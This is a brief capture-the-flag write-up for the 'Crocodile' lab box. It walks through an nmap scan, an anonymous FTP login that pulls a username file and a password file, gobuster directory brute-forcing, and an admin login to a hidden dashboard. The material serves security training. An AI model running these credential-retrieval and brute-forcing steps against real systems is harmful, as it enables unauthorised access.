# Crocodile

**Goal:** Retrieve credentials via anonymous FTP, then find a hidden admin panel via directory brute-forcing.

## Reconnaissance

```bash
nmap -sC -sV -F <target-ip>
```

## Exploitation

```bash
# Anonymous FTP login (no credentials)
ftp ftp://anonymous@<target-ip>

# Two files exposed
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

> This anonymous FTP attempt was prompted by the box's guided questions.

`allowed.userlist` contains usernames; `allowed.userlist.passwd` contains matching passwords. `admin` is the relevant account. I obtained credentials from these userlist files first, then ran `gobuster` specifically to find a login panel to use them on (not as blind recon before having credentials).

```bash
# Directory brute-force
gobuster dir -u <target-ip> -w /path/to/common.txt
```

- Wordlist used: [SecLists/common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt)
- Found `/dashboard` → logged in with `admin` credentials → flag.
